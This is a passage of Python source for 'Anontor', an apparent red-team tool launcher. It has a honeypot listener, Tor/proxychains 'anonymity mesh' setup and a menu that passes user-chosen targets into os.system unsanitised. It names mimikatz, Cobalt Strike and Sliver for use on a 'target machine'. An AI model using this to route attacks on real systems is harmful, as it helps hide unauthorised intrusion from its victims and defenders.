            except Exception as e: print(f"\033[91m[-] Error on port {port}: {e}\033[0m")

        if not servers: return
        print("\n[*] Honeypot active. Waiting for scanners...")
        try:
            while True:
                readable, _, _ = select.select([s[0] for s in servers], [], [], 1.0)
                for s in readable:
                    conn, addr = s.accept()
                    port = next(p for sock, p in servers if sock == s)
                    print(f"\033[91m[!] SCANNER DETECTED: {addr[0]} connected to port {port}\033[0m")
                    conn.close()
        except KeyboardInterrupt: pass
        for s, _ in servers: s.close()
        input("\n[+] Press Enter to return...")

    def anon_mesh_191(self):
        self.clear_screen()
        print("\033[96m[*] INITIATING LEVEL 191 ANONYMITY MESH (5 Tor Nodes)...\033[0m")
        config = "strict_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\n"
        for port in range(9050, 9055): config += f"socks5 127.0.0.1 {port}\n"
        with open("anontor_proxychains.conf", "w") as f: f.write(config)
        os.system("tor > /dev/null 2>&1 &")
        time.sleep(3)
        print("\033[93m[!] Mesh Active. Routing commands through 5 Tor hops.\033[0m")
        input("\n[+] Press Enter to return...")

    def anon_mesh_192(self):
        self.clear_screen()
        print("\033[96m[*] INITIATING LEVEL 192 ANONYMITY MESH (100 Hops)...\033[0m")
        config = "dynamic_chain\nproxy_dns\ntcp_read_time_out 30000\ntcp_connect_time_out 15000\n\n[ProxyList]\n"
        for _ in range(100): config += "socks5 127.0.0.1 9050\n"
        with open("anontor_proxychains.conf", "w") as f: f.write(config)
        os.system("tor > /dev/null 2>&1 &")
        time.sleep(3)
        print("\033[93m[!] Mesh Active. Prepare for extreme latency.\033[0m")
        input("\n[+] Press Enter to return...")

    def add_custom_proxies(self):
        self.clear_screen()
        print("\033[96m[*] ADD CUSTOM PROXIES TO ANONYMITY MESH...\033[0m")
        print("[*] Format: [type] [IP] [Port] (e.g., socks5 127.0.0.1 9050)")
        print("[*] Type 'done' to finish.\n")

        if not os.path.exists("anontor_proxychains.conf"):
            config = "dynamic_chain\nproxy_dns\ntcp_read_time_out 30000\ntcp_connect_time_out 15000\n\n[ProxyList]\n"
            with open("anontor_proxychains.conf", "w") as f:
                f.write(config)

        added = 0
        while True:
            proxy = input("\033[92m[?] Enter proxy (or 'done'): \033[0m").strip()
            if proxy.lower() == 'done' or not proxy:
                break
            
            parts = proxy.split()
            if len(parts) >= 3 and parts[0].lower() in ['socks5', 'socks4', 'http']:
                with open("anontor_proxychains.conf", "a") as f:
                    f.write(proxy + "\n")
                print(f"\033[92m[+] Added: {proxy}\033[0m")
                added += 1
            else:
                print("\033[91m[-] Invalid format. Use: [type] [IP] [Port]\033[0m")

        if added > 0:
            print(f"\n\033[92m[*] Successfully added {added} proxies.\033[0m")
            print("\n[*] Current Proxy List:")
            with open("anontor_proxychains.conf", "r") as f:
                lines = f.readlines()
            in_proxylist = False
            for line in lines:
                if "[ProxyList]" in line:
                    in_proxylist = True
                elif in_proxylist and line.strip() and not line.startswith("#"):
                    print(f"  - {line.strip()}")
            print("\n[*] All commands will now route through these proxies.")
        else:
            print("\n[-] No proxies added.")
        
        input("\n[+] Press Enter to return...")

    def check_binary(self, command):
        binary = command.split()[0]
        if binary == "su" or binary == "tsu":
            return True
        return shutil.which(binary) is not None

    def execute_command(self, command):
        self.clear_screen()
        print(f"\n[EXEC] Running: {command}")
        print("-" * 40)

        if not self.check_binary(command):
            binary = command.split()[0]
            print(f"[!] Warning: Binary '{binary}' not found.")
            if binary in ["powershell", "mimikatz.exe", "cobaltstrike", "sliver"]:
                print(f"[!] Note: '{binary}' is a Windows/External tool. Run this command on your target machine.")
            else:
                print(f"[!] Try installing it: pip install {binary} OR go install {binary}")
        else:
            try:
                if os.path.exists("anontor_proxychains.conf"):
                    print("\033[96m[*] Routing through Anontor Anonymity Mesh...\033[0m")
                    os.system(f"proxychains4 -q -f anontor_proxychains.conf {command}")
                else:
                    os.system(command)
            except Exception as e:
                print(f"[!] Error: {e}")
                
        print("-" * 40)
        print("\n\033[93m[!] REMEMBER: Use this ONLY against authorized targets.\033[0m")
        print("\033[91m[!] Unauthorized attacks are illegal and you can get caught!\033[0m\n")
        
        self.history.append(command)
        if len(self.history) > 5: self.history.pop(0)
        
        input("Press Enter to return to the menu...")
        self.skip_clear = True 

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def interactive_mode(self):
        items_per_page = 15
        total_pages = (len(self.global_tools) + items_per_page - 1) // items_per_page
        current_page = 1

        banner = """
\033[38;5;208m      █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗████████╗ ██████╗ ██████╗ 
     ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚══██╔══╝██╔═══██╗██╔══██╗
     ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║   ██║   ██║   ██║██████╔╝
     ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║   ██║   ██║   ██║██╔══██╗
     ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ╚██████╔╝██║  ██║
     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
\033[96m                 [ Red Team Framework ] - v4.0 \033[0m
        """

        while True:
            if not self.skip_clear:
                self.clear_screen()
            self.skip_clear = False 
            
            print(banner)
            
            print("\033[38;5;91m" + "="*75)
            print(f"                 PAGE {current_page} / {total_pages}")
            print("="*75 + "\033[0m")
            
            start_idx = (current_page - 1) * items_per_page
            end_idx = min(start_idx + items_per_page, len(self.global_tools))
            
            for i in range(start_idx, end_idx):
                cat, name, cmd = self.global_tools[i]
                display_name = name if len(name) < 56 else name[:53] + "..."
                print(f"  \033[95m[{i+1:3}]\033[0m \033[91m[\033[0m\033[96m{cat.upper():<9}\033[0m\033[91m]\033[0m \033[92m{display_name}\033[0m")
                
            print("\n\033[38;5;91m" + "-"*75 + "\033[0m")
            print("\033[94m  \033[91m[\033[94mn\033[91m]\033[94m Next Page | \033[91m[\033[94mp\033[91m]\033[94m Previous Page | \033[91m[\033[94mq\033[91m]\033[94m Quit\033[0m")
            if self.history:
                print(f"  Last executed: {self.history[-1][:50]}...")
            
            try:
                cmd = input(f"\n\033[91m[anontor] > \033[0m").strip().lower()
                
                if cmd == 'q':
                    print("[*] Closing connection...")
                    time.sleep(0.5)
                    self.clear_screen()
                    break
                elif cmd == 'n':
                    if current_page < total_pages: current_page += 1
                elif cmd == 'p':
                    if current_page > 1: current_page -= 1
                elif cmd.isdigit():
                    idx = int(cmd) - 1
                    if 0 <= idx < len(self.global_tools):
                        cat, name, tool_cmd = self.global_tools[idx]
                        
                        if cat == "mesh":
                            if "5-Hop" in name: self.anon_mesh_191()
                            elif "100-Hop" in name: self.anon_mesh_192()
                            elif "Custom" in name: self.add_custom_proxies()
                        elif cat == "native":
                            if "Ultra" in name: self.ultra_scanner()
                            else: self.hybrid_cpp_scanner()
                        elif cat == "honeypot":
                            self.honeypot_listener()
                        else:
                            print(f"\n[*] Selected: {name}")
                            if "{TARGET}" in tool_cmd:
                                target_input = input("\033[91m[\033[0m\033[92m?\033[0m\033[91m]\033[0m \033[92mEnter Target (IP/Domain/Username/Phone): \033[0m").strip()
                                if target_input:
                                    self.execute_command(tool_cmd.replace("{TARGET}", target_input))
                                else:
                                    print("[-] No target provided. Aborting.")
                                    time.sleep(1)
                            else:
                                self.execute_command(tool_cmd)
                    else:
                        print("[-] Invalid number.")
                        time.sleep(1)
                else:
                    print("[-] Invalid input. Type a number, 'n', 'p', or 'q'.")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                self.clear_screen()

if __name__ == "__main__":
    sys.stdout.write("\033[?1049h\033[?47h")
    sys.stdout.flush()
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
        boot_sequence()
        rt = AnontorFramework()
        rt.interactive_mode()
    finally:
        sys.stdout.write('\033[?1049l')
        sys.stdout.flush()
